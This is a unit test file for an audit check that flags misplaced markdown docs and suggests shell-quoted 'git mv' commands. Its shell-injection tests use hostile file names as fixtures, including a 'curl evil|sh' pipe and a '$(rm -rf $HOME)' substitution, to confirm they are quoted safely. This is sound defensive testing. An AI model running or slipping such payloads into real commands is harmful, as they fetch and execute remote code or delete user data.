/**
 * checks-doc-type.test.ts — unit tests for src/audit/checks/doc-type.ts.
 *
 * Closes the high-value coverage gaps surfaced in /ship's coverage audit
 * + the codex ship review's CRITICAL shell-injection finding. Tests:
 *
 *   - Shell injection defense: paths with `;`, `$()`, backticks, spaces,
 *     leading dashes, embedded single quotes — all single-quoted in the
 *     emitted `Suggested: git mv ...` line.
 *   - Inbox always-block (Track 8A): inbox-mismatch findings always emit
 *     "review and move (no automated suggestion — inbox content typically
 *     wants merge, not rename)" regardless of TODOS.md location state.
 *     Replaces the prior inbox-destination-resolution tests — that branch
 *     no longer exists in `suggestionFor`.
 *   - Skip rules: allowlist (CONTRIBUTING.md, *checklist*.md), root docs
 *     (README.md), project docs (TODOS.md), in-docs/designs/ (mermaid
 *     fence INSIDE the canonical location), tiny stubs (<5 content lines).
 *   - Plantuml fence (paired with mermaid in the regex; previously only
 *     mermaid had a fixture).
 *   - Collision: design destination already exists → "review and move"
 *     suggestion, no destructive git mv emitted.
 *
 * Constructs a minimal AuditCtx shape directly — runCheckDocType only
 * reads ctx.mdFiles, ctx.repoRoot, ctx.exists.{rootTodos,docsTodos}, so
 * we don't need the full buildAuditCtx machinery for these unit tests.
 */

import { afterAll, describe, expect, test } from 'bun:test';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { runCheckDocType } from '../src/audit/checks/doc-type.ts';
import type { AuditCtx, AuditFileExists, MdFileSnapshot } from '../src/audit/types.ts';
import { makeBaseTmp } from './helpers/fixture-repo.ts';

const baseTmp = makeBaseTmp('check-doc-type-');
afterAll(() => {
  try { rmSync(baseTmp, { recursive: true, force: true }); } catch {}
});

// Construct a minimal AuditCtx for runCheckDocType. Only the fields the
// check actually reads are populated; everything else is left empty/null.
function makeCtx(opts: {
  repoRoot: string;
  mdFiles: MdFileSnapshot[];
  rootTodos?: boolean;
  docsTodos?: boolean;
}): AuditCtx {
  const exists = {
    rootTodos: opts.rootTodos ?? false,
    docsTodos: opts.docsTodos ?? false,
  } as unknown as AuditFileExists;
  return { repoRoot: opts.repoRoot, mdFiles: opts.mdFiles, exists } as unknown as AuditCtx;
}

function makeFile(rel: string, content: string): MdFileSnapshot {
  return { abs: join('/fake', rel), rel, content };
}

const CHECKBOX_HEAVY_CONTENT = [
  '- [ ] Item one',
  '- [ ] Item two',
  '- [ ] Item three',
  '- [ ] Item four',
  '- [ ] Item five',
  '- [ ] Item six',
].join('\n');

const MERMAID_CONTENT = [
  'Some intro text.',
  'A second line so we have content.',
  '',
  '```mermaid',
  'graph TD',
  '  A --> B',
  '  B --> C',
  '```',
  '',
  'Footer line.',
].join('\n');

const PLANTUML_CONTENT = [
  'Some intro text.',
  'A second line.',
  '',
  '```plantuml',
  '@startuml',
  'A -> B',
  '@enduml',
  '```',
  '',
  'Footer.',
].join('\n');

// ─── Shell injection defense ─────────────────────────────────────────

describe('runCheckDocType: shell-safe suggestion quoting', () => {
  test('paths with semicolons are single-quoted', () => {
    const repoRoot = join(baseTmp, `shell-semi-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const evilName = 'docs/a;curl evil|sh.md';
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(evilName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    // The suggestion must single-quote the malicious path so it cannot
    // execute when copy-pasted.
    expect(body).toContain(`'${evilName}'`);
    // And the destination uses `git mv -- ` (end-of-options sentinel)
    // so a leading-dash filename is never interpreted as a flag.
    expect(body).toContain('git mv -- ');
    // Critically: the unquoted form must NOT appear.
    expect(body).not.toContain('git mv ' + evilName);
  });

  test('paths with $(), backticks, and dollar signs are quoted', () => {
    const repoRoot = join(baseTmp, `shell-meta-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const evilName = 'docs/$(rm -rf $HOME).md';
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(evilName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    // Inside single quotes, $() and backticks are literal — safe.
    expect(body).toContain(`'${evilName}'`);
  });

  test('paths with embedded single quotes are escaped via close-escape-reopen', () => {
    const repoRoot = join(baseTmp, `shell-quote-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const evilName = "docs/it's-tricky.md";
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(evilName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    // The classic POSIX trick: 'foo'\''bar' (close, escaped quote, reopen).
    expect(body).toContain(String.raw`'docs/it'\''s-tricky.md'`);
  });

  test('paths with spaces are safely quoted (no shell-word-splitting)', () => {
    const repoRoot = join(baseTmp, `shell-space-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const spacedName = 'docs/with spaces.md';
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(spacedName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain(`'${spacedName}'`);
  });
});

// ─── Inbox always-block (Track 8A) ───────────────────────────────────
//
// Per Track 8A's CEO + eng review (codex catch): inbox-mismatch findings
// (checkbox-density >= 0.50 outside TODOS.md) ALWAYS emit "review and move
// (no automated suggestion — inbox content typically wants merge, not
// rename)" regardless of whether docs/TODOS.md exists, root TODOS.md
// exists, or neither exists. Moving a checkbox-heavy file into TODOS.md
// is almost always a merge/import operation, not a rename — `git mv`
// is the wrong tool. The pre-Track-8A behavior emitted git-mv suggestions
// targeting whichever TODOS.md location existed, which is the bug class
// this block now locks shut.

describe('runCheckDocType: inbox-mismatch is always-block', () => {
  test('docs/TODOS.md exists → no git-mv suggestion, always-block wording', () => {
    const repoRoot = join(baseTmp, `inbox-docs-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/random-inbox.md', CHECKBOX_HEAVY_CONTENT)],
      docsTodos: true,
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('review and move');
    expect(body).toContain('inbox content typically wants merge, not rename');
    // No git mv emitted for inbox findings, regardless of dest location.
    expect(body).not.toContain('git mv');
  });

  test('only root TODOS.md exists → no git-mv suggestion, always-block wording', () => {
    const repoRoot = join(baseTmp, `inbox-root-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('inbox.md', CHECKBOX_HEAVY_CONTENT)],
      rootTodos: true,
      docsTodos: false,
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain('inbox content typically wants merge, not rename');
    expect(body).not.toContain('git mv');
  });

  test('neither TODOS.md exists → no git-mv suggestion, always-block wording', () => {
    const repoRoot = join(baseTmp, `inbox-neither-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('inbox.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain('inbox content typically wants merge, not rename');
    expect(body).not.toContain('git mv');
  });

  test('inbox short-circuits before collision detection (no destination check)', () => {
    // Even if docs/TODOS.md exists on disk (would normally trigger the
    // collision branch), inbox findings emit always-block wording —
    // they short-circuit before collision detection runs.
    const repoRoot = join(baseTmp, `inbox-shortcircuit-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    writeFileSync(join(repoRoot, 'docs', 'TODOS.md'), '# Existing inbox\n');
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('random-inbox.md', CHECKBOX_HEAVY_CONTENT)],
      docsTodos: true,
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain('inbox content typically wants merge, not rename');
    // NOT the collision-branch wording — different always-block reason.
    expect(body).not.toContain('destination ambiguous');
  });
});

// ─── Skip rules (don't flag legitimate cases) ─────────────────────────

describe('runCheckDocType: skip rules', () => {
  test('CONTRIBUTING.md with checkbox-heavy content is NOT flagged (allowlist)', () => {
    const repoRoot = join(baseTmp, `skip-contrib-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('CONTRIBUTING.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('release-checklist.md (matches *checklist* pattern) is NOT flagged', () => {
    const repoRoot = join(baseTmp, `skip-checklist-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/release-checklist.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('README.md with mermaid fence is NOT flagged (ROOT_DOCS)', () => {
    const repoRoot = join(baseTmp, `skip-readme-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('README.md', MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('TODOS.md with checkbox-heavy content is NOT flagged (PROJECT_DOCS)', () => {
    const repoRoot = join(baseTmp, `skip-todos-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('TODOS.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('mermaid fence INSIDE docs/designs/ is NOT flagged (already canonical)', () => {
    const repoRoot = join(baseTmp, `skip-designs-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/designs/system-flow.md', MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('file with fewer than 5 content lines is skipped (tiny stub)', () => {
    const repoRoot = join(baseTmp, `skip-stub-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    // 3 content lines, all checkbox — would be 100% density, but skip
    // because contentLines < MIN_CONTENT_LINES (5).
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [
        makeFile('tiny.md', '- [ ] one\n- [ ] two\n- [ ] three\n'),
      ],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });
});

// ─── Plantuml fence (paired with mermaid in the regex) ───────────────

describe('runCheckDocType: plantuml fence triggers design-mismatch', () => {
  test('plantuml fence outside docs/designs/ is flagged like mermaid', () => {
    const repoRoot = join(baseTmp, `plantuml-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/sequence.md', PLANTUML_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('looks like a design doc (mermaid/plantuml fence)');
    expect(body).toContain("'docs/designs/sequence.md'");
    // docs/designs/ doesn't exist in this fixture, so the suggestion must
    // prefix `mkdir -p 'docs/designs' && ...` before the git mv. Pin the
    // shape so the implicit branch can't regress to a bare git mv.
    expect(body).toContain("mkdir -p 'docs/designs' && ");
  });
});

// ─── Boundary cases: contentLines + density ─────────────────────────
//
// The heuristic has two numeric gates: contentLines >= MIN_CONTENT_LINES (5)
// and density >= CHECKBOX_DENSITY_THRESHOLD (0.5). Tests pin both at their
// decision points so an off-by-one (e.g., `>=` → `>`) or threshold change
// trips a test instead of silently shifting behavior.
//
// 5-line denominators can only produce density values {0, 0.2, 0.4, 0.6,
// 0.8, 1.0} — the 0.5 boundary requires an even denominator. Fixtures use
// 10 content lines so 4/10, 5/10, 6/10 land at 0.4 / 0.5 / 0.6 exactly.

const CONTENT_10_LINES_4_CHECKBOX = [
  'First plain line of prose content.',
  'Second plain line of prose content.',
  'Third plain line of prose content.',
  'Fourth plain line of prose content.',
  'Fifth plain line of prose content.',
  'Sixth plain line of prose content.',
  '- [ ] first checkbox',
  '- [ ] second checkbox',
  '- [ ] third checkbox',
  '- [ ] fourth checkbox',
].join('\n');

const CONTENT_10_LINES_5_CHECKBOX = [
  'First plain line of prose content.',
  'Second plain line of prose content.',
  'Third plain line of prose content.',
  'Fourth plain line of prose content.',
  'Fifth plain line of prose content.',
  '- [ ] first checkbox',
  '- [ ] second checkbox',
  '- [ ] third checkbox',
  '- [ ] fourth checkbox',
  '- [ ] fifth checkbox',
].join('\n');

const CONTENT_10_LINES_6_CHECKBOX = [
  'First plain line of prose content.',
  'Second plain line of prose content.',
  'Third plain line of prose content.',
  'Fourth plain line of prose content.',
  '- [ ] first checkbox',
  '- [ ] second checkbox',
  '- [ ] third checkbox',
  '- [ ] fourth checkbox',
  '- [ ] fifth checkbox',
  '- [ ] sixth checkbox',
].join('\n');

const CONTENT_4_LINES_ALL_CHECKBOX = [
  '- [ ] one',
  '- [ ] two',
  '- [ ] three',
  '- [ ] four',
].join('\n');

describe('runCheckDocType: content-line boundary (MIN_CONTENT_LINES = 5)', () => {
  test('empty file (0 content lines) is skipped', () => {
    const repoRoot = join(baseTmp, `boundary-empty-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/empty.md', '')],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('4 content lines all checkboxes is skipped (under MIN)', () => {
    const repoRoot = join(baseTmp, `boundary-4lines-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    // 100% density would normally fire — proves the MIN_CONTENT_LINES gate
    // suppresses density-based findings before they're evaluated.
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/short-inbox.md', CONTENT_4_LINES_ALL_CHECKBOX)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });
});

describe('runCheckDocType: density boundary (CHECKBOX_DENSITY_THRESHOLD = 0.5, >=)', () => {
  test('density 0.4 (4/10, just below threshold) is NOT flagged', () => {
    const repoRoot = join(baseTmp, `boundary-d04-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/below.md', CONTENT_10_LINES_4_CHECKBOX)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('density 0.5 (5/10, EXACTLY at threshold) fires per `>=`', () => {
    const repoRoot = join(baseTmp, `boundary-d05-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/exact.md', CONTENT_10_LINES_5_CHECKBOX)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('looks like a TODO inbox');
  });

  test('density 0.6 (6/10, just above threshold) fires', () => {
    const repoRoot = join(baseTmp, `boundary-d06-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/above.md', CONTENT_10_LINES_6_CHECKBOX)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('looks like a TODO inbox');
  });
});

// ─── Collision branch (destination exists) ──────────────────────────

describe('runCheckDocType: collision branch suppresses git mv', () => {
  test('design destination already exists → "review and move" emitted', () => {
    const repoRoot = join(baseTmp, `collision-design-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs', 'designs'), { recursive: true });
    // Pre-create the destination file so suggestionFor's existsSync hits.
    writeFileSync(
      join(repoRoot, 'docs', 'designs', 'arch.md'),
      '# Existing design doc\n',
    );
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/arch.md', MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('review and move');
    expect(body).toContain('destination ambiguous');
    // No destructive git mv emitted.
    expect(body).not.toContain('git mv -- ');
  });
});
